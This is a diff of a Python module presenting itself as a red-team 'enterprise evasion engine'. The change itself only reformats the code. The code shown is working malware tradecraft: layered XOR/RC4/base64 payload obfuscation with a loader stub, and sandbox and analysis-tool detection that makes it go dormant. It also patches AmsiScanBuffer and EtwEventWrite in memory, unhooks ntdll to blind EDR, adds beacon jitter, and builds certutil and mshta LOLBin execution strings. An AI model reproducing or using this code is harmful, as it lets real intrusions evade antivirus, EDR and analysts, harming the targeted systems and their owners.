@@ -18,17 +18,17 @@ Real techniques used in professional red team engagements:
   8. Living-off-the-Land (LOLBins) preference
 """
 
-import os
-import sys
-import time
-import random
 import base64
-import struct
 import hashlib
+import os
 import platform
+import random
+import struct
 import subprocess
+import sys
 import threading
-from typing import Optional, List, Dict, Tuple
+import time
+from typing import Dict, List, Optional, Tuple
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
@@ -84,19 +84,19 @@ class PayloadObfuscator:
         layer3 = base64.b64encode(layer2).decode()
 
         return {
-            'payload': layer3,
-            'xor_key': base64.b64encode(xor_key).decode(),
-            'rc4_key': base64.b64encode(rc4_key).decode(),
-            'layers': 3,
-            'original_size': len(payload),
-            'encoded_size': len(layer3),
+            "payload": layer3,
+            "xor_key": base64.b64encode(xor_key).decode(),
+            "rc4_key": base64.b64encode(rc4_key).decode(),
+            "layers": 3,
+            "original_size": len(payload),
+            "encoded_size": len(layer3),
         }
 
     def deobfuscate(self, encoded: Dict) -> bytes:
         """Reverse multi-layer obfuscation."""
-        layer3 = base64.b64decode(encoded['payload'])
-        rc4_key = base64.b64decode(encoded['rc4_key'])
-        xor_key = base64.b64decode(encoded['xor_key'])
+        layer3 = base64.b64decode(encoded["payload"])
+        rc4_key = base64.b64decode(encoded["rc4_key"])
+        xor_key = base64.b64decode(encoded["xor_key"])
         layer2, _ = self.rc4_encode(layer3, rc4_key)  # RC4 is symmetric
         layer1 = bytes([layer2[i] ^ xor_key[i % len(xor_key)] for i in range(len(layer2))])
         return layer1
@@ -109,7 +109,7 @@ class PayloadObfuscator:
         nop_ratio = 3  # 3 NOPs per byte of shellcode
         result = bytearray()
         for byte in shellcode:
-            result.extend(b'\x90' * nop_ratio)  # x86 NOP
+            result.extend(b"\x90" * nop_ratio)  # x86 NOP
             result.append(byte)
         return bytes(result)
 
@@ -121,11 +121,11 @@ class PayloadObfuscator:
         obf = self.multi_layer_obfuscate(payload)
 
         # Random variable names
-        chars = 'abcdefghijklmnopqrstuvwxyz'
-        v1 = ''.join(random.choices(chars, k=random.randint(5, 12)))
-        v2 = ''.join(random.choices(chars, k=random.randint(5, 12)))
-        v3 = ''.join(random.choices(chars, k=random.randint(5, 12)))
-        v4 = ''.join(random.choices(chars, k=random.randint(5, 12)))
+        chars = "abcdefghijklmnopqrstuvwxyz"
+        v1 = "".join(random.choices(chars, k=random.randint(5, 12)))
+        v2 = "".join(random.choices(chars, k=random.randint(5, 12)))
+        v3 = "".join(random.choices(chars, k=random.randint(5, 12)))
+        v4 = "".join(random.choices(chars, k=random.randint(5, 12)))
 
         stub = f"""
 import base64,struct,os
@@ -156,20 +156,35 @@ class SandboxDetector:
     """
 
     SANDBOX_PROCESSES = [
-        'vmsrvc', 'vmtoolsd', 'vmwaretray', 'vmwareuser',  # VMware
-        'vboxservice', 'vboxtray',  # VirtualBox
-        'wireshark', 'processhacker', 'procmon', 'procexp',  # Analysis tools
-        'ollydbg', 'x32dbg', 'x64dbg', 'windbg',  # Debuggers
-        'fiddler', 'burpsuite', 'charlieproxy',  # Traffic analysis
-        'regmon', 'filemon', 'autoruns',  # Sysinternals
-        'cuckoo', 'fakenet',  # Sandbox frameworks
+        "vmsrvc",
+        "vmtoolsd",
+        "vmwaretray",
+        "vmwareuser",  # VMware
+        "vboxservice",
+        "vboxtray",  # VirtualBox
+        "wireshark",
+        "processhacker",
+        "procmon",
+        "procexp",  # Analysis tools
+        "ollydbg",
+        "x32dbg",
+        "x64dbg",
+        "windbg",  # Debuggers
+        "fiddler",
+        "burpsuite",
+        "charlieproxy",  # Traffic analysis
+        "regmon",
+        "filemon",
+        "autoruns",  # Sysinternals
+        "cuckoo",
+        "fakenet",  # Sandbox frameworks
     ]
 
     SANDBOX_ARTIFACTS = [
-        r'C:\cuckoo',
-        r'C:\inetsim',
-        r'/tmp/cuckoo',
-        '/etc/cuckoo',
+        r"C:\cuckoo",
+        r"C:\inetsim",
+        r"/tmp/cuckoo",
+        "/etc/cuckoo",
     ]
 
     def is_sandboxed(self) -> Tuple[bool, List[str]]:
@@ -182,45 +197,47 @@ class SandboxDetector:
         # 1. Process-based detection
         try:
             import psutil
-            running = [p.info['name'].lower() for p in psutil.process_iter(['name'])]
+
+            running = [p.info["name"].lower() for p in psutil.process_iter(["name"])]
             for sb_proc in self.SANDBOX_PROCESSES:
                 if sb_proc in running:
-                    reasons.append(f'sandbox_process:{sb_proc}')
+                    reasons.append(f"sandbox_process:{sb_proc}")
         except ImportError:
             pass
 
         # 2. File artifact detection
         for artifact in self.SANDBOX_ARTIFACTS:
             if os.path.exists(artifact):
-                reasons.append(f'sandbox_artifact:{artifact}')
+                reasons.append(f"sandbox_artifact:{artifact}")
 
         # 3. Timing attack (sandboxes accelerate time)
         start = time.time()
         time.sleep(1)
         elapsed = time.time() - start
         if elapsed < 0.5:
-            reasons.append('timing_anomaly:time_accelerated')
+            reasons.append("timing_anomaly:time_accelerated")
 
         # 4. CPU count (sandboxes often have 1-2 CPUs)
         cpu_count = os.cpu_count() or 0
         if cpu_count <= 1:
-            reasons.append(f'low_cpu_count:{cpu_count}')
+            reasons.append(f"low_cpu_count:{cpu_count}")
 
         # 5. RAM check (sandboxes often have < 2GB)
         try:
             import psutil
-            ram_gb = psutil.virtual_memory().total / (1024 ** 3)
+
+            ram_gb = psutil.virtual_memory().total / (1024**3)
             if ram_gb < 1.5:
-                reasons.append(f'low_ram:{ram_gb:.1f}GB')
+                reasons.append(f"low_ram:{ram_gb:.1f}GB")
         except ImportError:
             pass
 
         # 6. Username suspicious names (sandbox defaults)
         try:
-            username = os.getenv('USERNAME', os.getenv('USER', '')).lower()
-            sandbox_users = ['sandbox', 'maltest', 'cuckoo', 'analyst', 'virus', 'malware']
+            username = os.getenv("USERNAME", os.getenv("USER", "")).lower()
+            sandbox_users = ["sandbox", "maltest", "cuckoo", "analyst", "virus", "malware"]
             if any(su in username for su in sandbox_users):
-                reasons.append(f'suspicious_username:{username}')
+                reasons.append(f"suspicious_username:{username}")
         except Exception:
             pass
 
@@ -238,15 +255,16 @@ class AMSIBypass:
 
     # Patch bytes: mov eax, AMSI_RESULT_CLEAN; ret
     # 0x80070057 = E_INVALIDARG (forces AMSI to skip)
-    PATCH_BYTES = b'\xB8\x57\x00\x07\x80\xC3'  # mov eax, 0x80070057; ret
+    PATCH_BYTES = b"\xb8\x57\x00\x07\x80\xc3"  # mov eax, 0x80070057; ret
 
     def bypass(self) -> bool:
-        if platform.system() != 'Windows':
+        if platform.system() != "Windows":
             logger.info("AMSI bypass: skipped (not Windows)")
             return False
         try:
             import ctypes
-            amsi = ctypes.WinDLL('amsi.dll')
+
+            amsi = ctypes.WinDLL("amsi.dll")
             scan_buffer = amsi.AmsiScanBuffer
 
             # Get function address
@@ -259,7 +277,7 @@ class AMSIBypass:
                 ctypes.c_void_p(func_ptr),
                 ctypes.c_size_t(8),
                 ctypes.c_ulong(0x40),  # PAGE_EXECUTE_READWRITE
-                ctypes.byref(old_protect)
+                ctypes.byref(old_protect),
             )
 
             # Write patch bytes
@@ -270,7 +288,7 @@ class AMSIBypass:
                 ctypes.c_void_p(func_ptr),
                 ctypes.c_size_t(8),
                 old_protect,
-                ctypes.byref(ctypes.c_ulong(0))
+                ctypes.byref(ctypes.c_ulong(0)),
             )
 
             logger.success("AMSI bypassed via AmsiScanBuffer memory patch")
@@ -289,15 +307,16 @@ class ETWSilencer:
     Prevents EDR from receiving kernel telemetry about our process.
     """
 
-    RET_PATCH = b'\xC3'  # just 'ret' — immediately returns, logs nothing
+    RET_PATCH = b"\xc3"  # just 'ret' — immediately returns, logs nothing
 
     def silence(self) -> bool:
-        if platform.system() != 'Windows':
+        if platform.system() != "Windows":
             return False
         try:
             import ctypes
-            ntdll = ctypes.WinDLL('ntdll.dll')
-            etw_func = getattr(ntdll, 'EtwEventWrite', None)
+
+            ntdll = ctypes.WinDLL("ntdll.dll")
+            etw_func = getattr(ntdll, "EtwEventWrite", None)
             if not etw_func:
                 return False
 
@@ -306,7 +325,9 @@ class ETWSilencer:
             old_prot = ctypes.c_ulong(0)
             kernel32.VirtualProtect(ctypes.c_void_p(func_ptr), 1, 0x40, ctypes.byref(old_prot))
             ctypes.memmove(func_ptr, self.RET_PATCH, 1)
-            kernel32.VirtualProtect(ctypes.c_void_p(func_ptr), 1, old_prot, ctypes.byref(ctypes.c_ulong(0)))
+            kernel32.VirtualProtect(
+                ctypes.c_void_p(func_ptr), 1, old_prot, ctypes.byref(ctypes.c_ulong(0))
+            )
 
             logger.success("ETW silenced via EtwEventWrite patch")
             return True
@@ -326,51 +347,56 @@ class DLLUnhooker:
     """
 
     def unhook_ntdll(self) -> bool:
-        if platform.system() != 'Windows':
+        if platform.system() != "Windows":
             return False
         try:
             import ctypes
-            ntdll_path = r'C:\Windows\System32\ntdll.dll'
+
+            ntdll_path = r"C:\Windows\System32\ntdll.dll"
 
             # Read clean copy from disk
-            with open(ntdll_path, 'rb') as f:
+            with open(ntdll_path, "rb") as f:
                 clean_dll = f.read()
 
             # Parse PE headers to find .text section
-            pe_offset = struct.unpack_from('<I', clean_dll, 0x3C)[0]
-            machine = struct.unpack_from('<H', clean_dll, pe_offset + 4)[0]
-            num_sections = struct.unpack_from('<H', clean_dll, pe_offset + 6)[0]
+            pe_offset = struct.unpack_from("<I", clean_dll, 0x3C)[0]
+            machine = struct.unpack_from("<H", clean_dll, pe_offset + 4)[0]
+            num_sections = struct.unpack_from("<H", clean_dll, pe_offset + 6)[0]
             section_offset = pe_offset + 24 + (240 if machine == 0x8664 else 224)
 
             text_rva = text_size = text_raw = 0
             for i in range(num_sections):
                 sec_off = section_offset + i * 40
-                name = clean_dll[sec_off:sec_off + 8].rstrip(b'\x00')
-                if name == b'.text':
-                    text_rva  = struct.unpack_from('<I', clean_dll, sec_off + 12)[0]
-                    text_size = struct.unpack_from('<I', clean_dll, sec_off + 16)[0]
-                    text_raw  = struct.unpack_from('<I', clean_dll, sec_off + 20)[0]
+                name = clean_dll[sec_off : sec_off + 8].rstrip(b"\x00")
+                if name == b".text":
+                    text_rva = struct.unpack_from("<I", clean_dll, sec_off + 12)[0]
+                    text_size = struct.unpack_from("<I", clean_dll, sec_off + 16)[0]
+                    text_raw = struct.unpack_from("<I", clean_dll, sec_off + 20)[0]
                     break
 
             if not text_rva:
                 return False
 
             # Get ntdll base address in current process
-            ntdll = ctypes.WinDLL('ntdll.dll')
+            ntdll = ctypes.WinDLL("ntdll.dll")
             ntdll_base = ctypes.cast(ntdll._handle, ctypes.c_void_p).value
             text_addr = ntdll_base + text_rva
 
             # Change protection
             kernel32 = ctypes.windll.kernel32
             old_prot = ctypes.c_ulong(0)
-            kernel32.VirtualProtect(ctypes.c_void_p(text_addr), text_size, 0x40, ctypes.byref(old_prot))
+            kernel32.VirtualProtect(
+                ctypes.c_void_p(text_addr), text_size, 0x40, ctypes.byref(old_prot)
+            )
 
             # Copy clean .text section
-            clean_text = clean_dll[text_raw:text_raw + text_size]
+            clean_text = clean_dll[text_raw : text_raw + text_size]
             ctypes.memmove(text_addr, clean_text, text_size)
 
             # Restore protection
-            kernel32.VirtualProtect(ctypes.c_void_p(text_addr), text_size, old_prot, ctypes.byref(ctypes.c_ulong(0)))
+            kernel32.VirtualProtect(
+                ctypes.c_void_p(text_addr), text_size, old_prot, ctypes.byref(ctypes.c_ulong(0))
+            )
 
             logger.success("ntdll.dll unhooked — EDR API monitoring bypassed")
             return True
@@ -391,6 +417,7 @@ class BeaconJitter:
     def sleep_jitter(self, base_seconds: float, jitter_percent: float = 0.3):
         """Sleep for base_seconds ± jitter_percent, log-normal distributed."""
         import math
+
         sigma = math.log(1 + jitter_percent)
         multiplier = random.lognormvariate(0, sigma)
         sleep_time = base_seconds * multiplier
@@ -404,7 +431,7 @@ class BeaconJitter:
         Wrap any network action with human-like pre/post delays.
         Humans don't click at exactly regular intervals.
         """
-        pre_delay  = random.uniform(0.5, 3.0)
+        pre_delay = random.uniform(0.5, 3.0)
         post_delay = random.uniform(0.2, 1.5)
         time.sleep(pre_delay)
         result = action_func(*args, **kwargs)
@@ -422,12 +449,12 @@ class EnterpriseEvasionEngine:
     """
 
     def __init__(self):
-        self.obfuscator  = PayloadObfuscator()
+        self.obfuscator = PayloadObfuscator()
         self.sandbox_det = SandboxDetector()
-        self.amsi        = AMSIBypass()
-        self.etw         = ETWSilencer()
-        self.unhocker    = DLLUnhooker()
-        self.jitter      = BeaconJitter()
+        self.amsi = AMSIBypass()
+        self.etw = ETWSilencer()
+        self.unhocker = DLLUnhooker()
+        self.jitter = BeaconJitter()
         self.applied: List[str] = []
 
     def apply_all(self, bail_on_sandbox: bool = True) -> Dict:
@@ -439,8 +466,8 @@ class EnterpriseEvasionEngine:
 
         # 0. Sandbox check first — abort if detected
         is_sb, reasons = self.sandbox_det.is_sandboxed()
-        results['sandbox_detected'] = is_sb
-        results['sandbox_reasons']  = reasons
+        results["sandbox_detected"] = is_sb
+        results["sandbox_reasons"] = reasons
         if is_sb and bail_on_sandbox:
             logger.warning(f"SANDBOX DETECTED: {reasons} — going dormant")
             time.sleep(random.uniform(300, 600))  # Sleep 5-10 min then retry
@@ -448,18 +475,21 @@ class EnterpriseEvasionEngine:
 
         # 1. DLL Unhooking (first — restores clean syscall table)
         r = self.unhocker.unhook_ntdll()
-        results['dll_unhooking'] = r
-        if r: self.applied.append('dll_unhooking')
+        results["dll_unhooking"] = r
+        if r:
+            self.applied.append("dll_unhooking")
 
         # 2. ETW silencing (before any noisy operations)
         r = self.etw.silence()
-        results['etw_silenced'] = r
-        if r: self.applied.append('etw_silenced')
+        results["etw_silenced"] = r
+        if r:
+            self.applied.append("etw_silenced")
 
         # 3. AMSI bypass (before any script execution)
         r = self.amsi.bypass()
-        results['amsi_bypassed'] = r
-        if r: self.applied.append('amsi_bypassed')
+        results["amsi_bypassed"] = r
+        if r:
+            self.applied.append("amsi_bypassed")
 
         logger.info(f"Evasion applied: {self.applied}")
         return results
@@ -475,7 +505,7 @@ class EnterpriseEvasionEngine:
         """
         lolbins = [
             # certutil decode base64 (classic)
-            lambda c: f'certutil -decode <encoded_payload> %TEMP%\\tmp.exe && %TEMP%\\tmp.exe',
+            lambda c: f"certutil -decode <encoded_payload> %TEMP%\\tmp.exe && %TEMP%\\tmp.exe",
             # mshta execute VBScript
             lambda c: f'mshta vbscript:Execute("{c}")',
             # rundll32 execute
